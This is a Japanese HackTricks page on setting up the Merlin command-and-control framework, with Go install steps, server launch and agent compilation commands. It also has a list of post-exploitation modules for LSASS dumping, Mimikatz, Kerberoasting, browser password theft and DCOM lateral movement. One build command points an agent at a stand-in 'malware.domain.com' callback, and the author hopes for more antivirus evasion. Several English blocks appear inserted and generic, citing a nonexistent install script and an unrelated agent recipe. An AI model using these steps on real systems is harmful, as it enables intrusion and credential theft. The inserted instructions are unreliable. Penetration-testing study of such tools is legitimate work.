<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- **サイバーセキュリティ企業で働いていますか？** **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！

- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。

- [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。

- [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**

- **ハッキングのトリックを共有するには、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)にPRを提出してください。**

</details>


# インストール

## GOのインストール
```
#Download GO package from: https://golang.org/dl/
#Decompress the packe using:
tar -C /usr/local -xzf go$VERSION.$OS-$ARCH.tar.gz

#Change /etc/profile
Add ":/usr/local/go/bin" to PATH
Add "export GOPATH=$HOME/go"
Add "export GOBIN=$GOPATH/bin"

source /etc/profile
```
## Merlinのインストール

To install Merlin, follow these steps:

1. Download the Merlin backdoor from the official website or a trusted source.
2. Extract the downloaded file to a desired location on your system.
3. Open a terminal or command prompt and navigate to the extracted Merlin directory.
4. Run the installation script by executing the following command: `./install.sh`.
5. Follow the prompts and provide the necessary information during the installation process.
6. Once the installation is complete, you can start using Merlin for backdoor functionality.

Merlinのインストール手順は以下の通りです：

1. 公式ウェブサイトまたは信頼できるソースからMerlinバックドアをダウンロードします。
2. ダウンロードしたファイルをシステム上の任意の場所に展開します。
3. ターミナルまたはコマンドプロンプトを開き、展開したMerlinディレクトリに移動します。
4. 次のコマンドを実行してインストールスクリプトを実行します：`./install.sh`。
5. インストールプロセス中に必要な情報を入力し、指示に従います。
6. インストールが完了したら、Merlinをバックドア機能として使用することができます。
```
go get https://github.com/Ne0nd0g/merlin/tree/dev #It is recommended to use the developer branch
cd $GOPATH/src/github.com/Ne0nd0g/merlin/
```
# Merlinサーバーの起動

To launch the Merlin server, follow the steps below:

1. Download the Merlin server package from the official website.
2. Extract the downloaded package to a desired location on your machine.
3. Open a terminal or command prompt and navigate to the extracted Merlin server directory.
4. Run the following command to start the Merlin server:

   ```bash
   ./merlin-server
   ```

   Note: If you encounter any permission issues, you may need to use `sudo` or run the command as an administrator.

5. Once the server is running, you can access the Merlin web interface by opening a web browser and entering the server's IP address followed by the port number (default is 8080). For example, `http://192.168.0.100:8080`.

By following these steps, you will be able to successfully launch the Merlin server and access its web interface.
```
go run cmd/merlinserver/main.go -i
```
# Merlin エージェント

[事前にコンパイルされたエージェントをダウンロード](https://github.com/Ne0nd0g/merlin/releases)することができます。

## エージェントのコンパイル

メインフォルダ _$GOPATH/src/github.com/Ne0nd0g/merlin/_ に移動します。
```
#User URL param to set the listener URL
make #Server and Agents of all
make windows #Server and Agents for Windows
make windows-agent URL=https://malware.domain.com:443/ #Agent for windows (arm, dll, linux, darwin, javascript, mips)
```
## **エージェントの手動コンパイル**

To manually compile agents, follow these steps:

1. **Choose the programming language**: Select the programming language you want to use for the agent. Common choices include C, C++, Python, and Java.

2. **Write the agent code**: Write the code for the agent, ensuring that it includes the necessary functionality for your specific needs. This may include features such as remote command execution, file system access, or network communication.

3. **Compile the agent**: Use the appropriate compiler for the chosen programming language to compile the agent code into an executable file. This will generate a binary file that can be executed on the target system.

4. **Test the agent**: Before deploying the agent, it is important to test its functionality and ensure that it works as intended. This can be done by running the compiled agent on a test system and verifying its behavior.

5. **Deploy the agent**: Once the agent has been tested and verified, it can be deployed on the target system. This can be done by transferring the compiled agent file to the target system and executing it.

By following these steps, you can manually compile agents to meet your specific requirements.
```
GOOS=windows GOARCH=amd64 go build -ldflags "-X main.url=https://10.2.0.5:443" -o agent.exe main.g
```
# モジュール

**悪いニュースは、Merlinが使用するすべてのモジュールがソース（Github）からダウンロードされ、使用する前にディスクに保存されるということです。よく知られたモジュールを使用する際には注意が必要です。なぜなら、Windows Defenderに検出される可能性があるからです！**


**SafetyKatz** --> 改変されたMimikatz。LSASSをファイルにダンプして、sekurlsa::logonpasswordsをそのファイルに実行します\
**SharpDump** --> 指定されたプロセスIDのminidump（デフォルトはLSASS）（最終ファイルの拡張子は.gzですが、実際は.binですが、.gzファイルです）\
**SharpRoast** --> Kerberoast（動作しません）\
**SeatBelt** --> CSのローカルセキュリティテスト（動作しません）https://github.com/GhostPack/Seatbelt/blob/master/Seatbelt/Program.cs\
**Compiler-CSharp** --> csc.exe /unsafeを使用してコンパイルします\
**Sharp-Up** --> powerupでのC#のすべてのチェック（動作します）\
**Inveigh** --> PowerShellADIDNS/LLMNR/mDNS/NBNSスプーファーおよび中間者攻撃ツール（動作しません、https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1をロードする必要があります）\
**Invoke-InternalMonologue** --> 利用可能なすべてのユーザーを偽装し、各ユーザーに対してチャレンジレスポンスを取得します（各ユーザーのNTLMハッシュ）（URLが不正です）\
**Invoke-PowerThIEf** --> IExplorerからフォームを盗み出すか、JSを実行するか、そのプロセスにDLLをインジェクトします（動作しません）（およびPSも動作しないようです）https://github.com/nettitude/Invoke-PowerThIEf/blob/master/Invoke-PowerThIEf.ps1\
**LaZagneForensic** --> ブラウザのパスワードを取得します（動作しますが、出力ディレクトリを表示しません）\
**dumpCredStore** --> Win32 Credential Manager API（https://github.com/zetlen/clortho/blob/master/CredMan.ps1）https://www.digitalcitizen.life/credential-manager-where-windows-stores-passwords-other-login-details\
**Get-InjectedThread** --> 実行中のプロセスでクラシックなインジェクションを検出します（Classic Injection（OpenProcess、VirtualAllocEx、WriteProcessMemory、CreateRemoteThread））（動作しません）\
**Get-OSTokenInformation** --> 実行中のプロセスとスレッドのトークン情報を取得します（ユーザー、グループ、特権、所有者などhttps://docs.microsoft.com/es-es/windows/desktop/api/winnt/ne-winnt-\_token_information_class）\
**Invoke-DCOM** --> DCOMを介して（他のコンピューターで）コマンドを実行します（http://www.enigma0x3.net.）（https://enigma0x3.net/2017/09/11/lateral-movement-using-excel-application-and-dcom/）\
**Invoke-DCOMPowerPointPivot** --> PowerPoint COMオブジェクト（ADDin）を悪用して、他のPCでコマンドを実行します\
**Invoke-ExcelMacroPivot** --> ExcelでDCOMを悪用して、他のPCでコマンドを実行します\
**Find-ComputersWithRemoteAccessPolicies** --> （動作しません）（https://labs.mwrinfosecurity.com/blog/enumerating-remote-access-policies-through-gpo/）\
**Grouper** --> グループポリシーの最も興味深い部分をダンプし、悪用可能なものを探します（非推奨）Grouper2を見てみてください、とても素敵です\
**Invoke-WMILM** --> 横方向に移動するためのWMI\
**Get-GPPPassword** --> groups.xml、scheduledtasks.xml、services.xml、datasources.xmlを検索し、平文のパスワードを返します（ドメイン内）\
**Invoke-Mimikatz** --> mimikatzを使用します（デフォルトのダンプクレデンシャル）\
**PowerUp** --> https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc\
**Find-BadPrivilege** --> コンピューターのユーザーの特権をチェックします\
**Find-PotentiallyCrackableAccounts** --> SPNに関連付けられたユーザーアカウントに関する情報を取得します（Kerberoasting）\
**psgetsystem** --> getsystem

**持続性モジュールはチェックしていません**

# 要約

このツールの感触とポテンシャルが本当に気に入っています。\
ツールがサーバーからモジュールをダウンロードし、スクリプトをダウンロードする際にいくつかの回避手段を組み込むことを願っています。


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- **サイバーセキュリティ企業で働いていますか？ HackTricksであなたの会社を宣伝したいですか？または、最新バージョンのPEASSを入手したり、HackTricksをPDFでダウンロードしたりしたいですか？ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！**

- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう、私たちの独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクション

- [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう

- **[💬](https://emojipedia.org/speech-balloon/) [Discordグループ](https://discord.gg/hRep4RUj7f)または[Telegramグループ](https://t.me/peass)に参加するか、**Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**をフォローしてください。**

- **ハッキングのトリックを共有するには、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)にPRを提出してください。**

</details>
